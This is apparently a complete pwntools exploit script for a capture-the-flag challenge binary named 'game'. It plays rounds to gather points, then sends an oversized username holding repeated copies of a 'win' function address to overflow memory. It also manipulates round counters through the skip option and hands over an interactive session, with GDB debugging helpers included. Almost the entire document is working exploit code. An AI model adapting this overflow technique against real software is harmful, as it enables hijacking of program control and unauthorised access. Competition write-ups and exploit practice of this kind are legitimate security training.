from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './game'
HOST = 'cop.ichsa.ctf.today'
PORT =  8011

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
win = 0x401813

def play():
	r.sendlineafter('option [ ]', '2')
	r.recvuntil('Game #')
	rounds = int(r.recvuntil('\n', True))
	r.sendlineafter('option [ ]', '2')
	return rounds
def skip(n):
	r.sendlineafter('option [ ]', '3')
	r.sendlineafter('skip [  ]', str(n))
def ena():
	r.sendlineafter('option [ ]', '4')
def change(name):
	r.sendlineafter('option [ ]', '5')
	r.sendlineafter('username: ', name)

point = 0
rounds = 0
while point < 5:
	r.recvuntil('player: ')
	point = int(r.recvuntil(' Points', True))
	rounds = play()
payload = "A"*(6+16)+flat(win, 1, 1) * (0x3e8//0x18)
change(payload)

dbg('rounds')
for i in range(8):
	skip(0xff)
skip(0xab+8-0x10)
ena()
if args.D:
	debug(r, [0x13d4])
play()

r.interactive()
r.close()
